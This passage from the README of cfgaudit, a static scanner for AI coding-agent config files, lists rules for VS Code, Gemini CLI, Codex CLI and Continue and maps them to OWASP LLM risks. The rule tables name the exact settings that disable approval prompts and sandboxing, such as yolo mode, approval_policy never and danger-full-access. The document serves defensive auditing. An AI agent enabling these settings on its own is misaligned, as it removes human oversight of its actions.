| [CFG048](docs/rules/CFG048.md) | error/warn | `.vscode/settings.json` weakens agent auto-approval — `chat.tools.edits.autoApprove` re-enabling a protected path such as `**/.vscode/*.json` (chains into CFG047), a host-unrestricted `chat.tools.urls.autoApprove`, or the blanket `chat.tools.global.autoApprove` (warn: application-scoped, so upstream ignores it from a workspace file) | LLM06 |

### Gemini CLI — `.gemini/settings.json` & `GEMINI.md`

[Gemini CLI](https://github.com/google-gemini/gemini-cli) stores its config in `settings.json` with a security surface that mirrors Claude Code's. cfgaudit discovers `.gemini/settings.json` (project) and `~/.gemini/settings.json` (with `--user`), and `GEMINI.md` (project) / `~/.gemini/GEMINI.md` — the latter scanned by the same content rules as `CLAUDE.md` (CFG024–CFG036, CFG057). A Gemini `mcpServers` block rides the shared MCP rules (CFG010–CFG021, CFG049–CFG059), attributed to the settings file. Three rules cover the Gemini-specific settings:

| ID | Severity | Description | OWASP |
|----|----------|-------------|-------|
| [CFG060](docs/rules/CFG060.md) | error | Gemini `general.defaultApprovalMode` is `auto_edit` (or `yolo`) — auto-approves tool actions, the Gemini equivalent of `defaultMode: bypassPermissions` | LLM06 |
| [CFG061](docs/rules/CFG061.md) | error/warn | Gemini sandbox weakened — `tools.sandboxAllowedPaths` exposes `/` or `~` (error), or `tools.sandboxNetworkAccess: true` gives sandboxed tools network egress (warn) | LLM06 |
| [CFG062](docs/rules/CFG062.md) | warn | Gemini `security.blockGitExtensions: false` with no `security.allowedExtensions` allow-list — installs extensions from arbitrary Git repos (supply chain) | LLM03 |

### OpenAI Codex CLI — `~/.codex/config.toml` & `AGENTS.md`

[OpenAI Codex CLI](https://github.com/openai/codex) keeps its config in `~/.codex/config.toml` (TOML) and uses `AGENTS.md` as its project instruction file. `AGENTS.md` is already scanned by the shared instruction-content rules (CFG024–CFG036, CFG057). With `--user`, cfgaudit also parses `~/.codex/config.toml`: its `[mcp_servers]` ride the shared MCP rules (CFG010–CFG021, CFG049–CFG059), its `notify` program (run by Codex on events) is scanned by the command-content rules (CFG008/014/015/027/028/037/038/039), and two rules cover the Codex-specific settings:

| ID | Severity | Description | OWASP |
|----|----------|-------------|-------|
| [CFG063](docs/rules/CFG063.md) | error/warn | Codex `approval_policy` is `never` (auto-approve all → error) or `on-failure` (deprecated, all auto-approved → warn) — the `bypassPermissions` analog | LLM06 |
| [CFG064](docs/rules/CFG064.md) | error | Codex `sandbox_mode` is `danger-full-access` — sandbox disabled, tools get full filesystem and network access | LLM06 |

### Continue — `.continue/config.yaml`

[Continue](https://github.com/continuedev/continue) configures MCP servers and model providers in `config.yaml`. cfgaudit discovers `.continue/config.yaml` (project) and `~/.continue/config.yaml` (`--user`). Its `mcpServers` **list** rides the shared MCP rules (CFG010–CFG021, CFG049–CFG059) — a remote `type: "sse"` server trips CFG058, a non-loopback `url` trips CFG049, and so on; its `rules` and `prompts` (trusted instruction context) are scanned by the instruction-content rules (CFG024–CFG036, CFG057). Continue-specific rules:

| ID | Severity | Description | OWASP |
|----|----------|-------------|-------|
| [CFG065](docs/rules/CFG065.md) | error | Continue config has a hardcoded inline `apiKey` literal on a `models[]` or remote `mcpServers[]` entry — a committed credential (`${{ secrets.* }}` references and placeholders are not flagged) | LLM02 |
| [CFG071](docs/rules/CFG071.md) | error | model/provider base URL over cleartext `http://` to a remote host — Continue `models[].apiBase` or Codex `chatgpt_base_url`/`[model_providers].base_url`; the API key is sent in plaintext (multi-provider analogue of CFG005) | LLM02 |

---

## OWASP mapping

cfgaudit is a **static auditor of AI-agent configuration files** (Claude Code first-class, with portable rules extended to other agents). It maps each finding to an [OWASP Top 10 for LLM Applications 2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) risk — but by design it only sees what is *declared in config*, not model behaviour, runtime traffic, or training data. That scope determines which risks it can and cannot address.

**Covered**

| ID | Risk | Example rules |
|----|------|---------------|
| LLM01 | [Prompt Injection](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM01_2025-Prompt_Injection.html) | CFG009, CFG015, CFG024, CFG026, CFG030, CFG032, CFG034, CFG056, CFG057, CFG080, CFG081 |
| LLM02 | [Sensitive Information Disclosure](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM02_2025-Sensitive_Information_Disclosure.html) | CFG005, CFG007, CFG012, CFG013, CFG016, CFG021, CFG031, CFG033, CFG036, CFG037, CFG038, CFG041, CFG042, CFG043, CFG044, CFG046, CFG049, CFG050, CFG054, CFG072, CFG073, CFG075, CFG078 |
| LLM03 | [Supply Chain Vulnerabilities](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM03_2025-Supply_Chain.html) | CFG010, CFG014, CFG052, CFG055, CFG074 |
| LLM06 | [Excessive Agency](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM06_2025-Excessive_Agency.html) | CFG001–CFG004, CFG006, CFG008, CFG011, CFG017–CFG020, CFG022, CFG023, CFG025, CFG027, CFG028, CFG029, CFG035, CFG039, CFG040, CFG045, CFG047, CFG048, CFG051, CFG053, CFG076, CFG077, CFG079 |

**Not covered**

| ID | Risk | Why it is out of scope |
|----|------|------------------------|
| LLM04 | [Data and Model Poisoning](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM04_2025-Data_and_Model_Poisoning.html) | Concerns training data and model weights. cfgaudit audits config files, not models or training pipelines. |
| LLM05 | [Improper Output Handling](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM05_2025-Improper_Output_Handling.html) | A runtime property of how downstream systems consume model output — not visible in static configuration. |
| LLM07 | [System Prompt Leakage](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM07_2025-System_Prompt_Leakage.html) | A runtime property of what the model reveals at inference time, not something declared in config. Where config *can* contribute — secrets embedded in `CLAUDE.md` or `settings.json` — that exposure is already covered under LLM02 (e.g. CFG013, CFG031). |
| LLM08 | [Vector and Embedding Weaknesses](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM08_2025-Vector_and_Embedding_Weaknesses.html) | Specific to RAG / embedding stores, which Claude Code configuration does not describe. |
| LLM09 | [Misinformation](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM09_2025-Misinformation.html) | A model-output-quality concern, not a configuration setting. |
| LLM10 | [Unbounded Consumption](https://owasp.org/www-project-top-10-for-large-language-model-applications/2025/LLM10_2025-Unbounded_Consumption.html) | Runtime resource / cost / DoS behaviour, not expressed in the config cfgaudit reads. |

---

## Test fixtures

Real-world `settings.json` examples live under `testdata/settings/`:

- `valid/` — configurations that must produce **zero** cfgaudit findings (minimal, fully-populated, team, managed-org).
- `invalid/` — one fixture per rule, named `CFG###_<slug>.json`. Each must trigger the rule encoded in its prefix.

`rules/fixtures_test.go` enforces both invariants on every Go test run, so fixtures and rule implementations stay in lockstep.

A separate workflow (`.github/workflows/schema-validation.yml`) validates every file in `valid/` against the [SchemaStore Claude Code settings schema](https://json.schemastore.org/claude-code-settings.json) on push, on pull request, and nightly. If the upstream schema changes, the nightly run opens (or comments on) a tracking issue so the fixtures and rules can be brought back in sync before silent breakage.

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for dev setup, the test loop, and the step-by-step recipe for adding a new rule.

---

## License

Apache 2.0 — see [LICENSE](LICENSE).
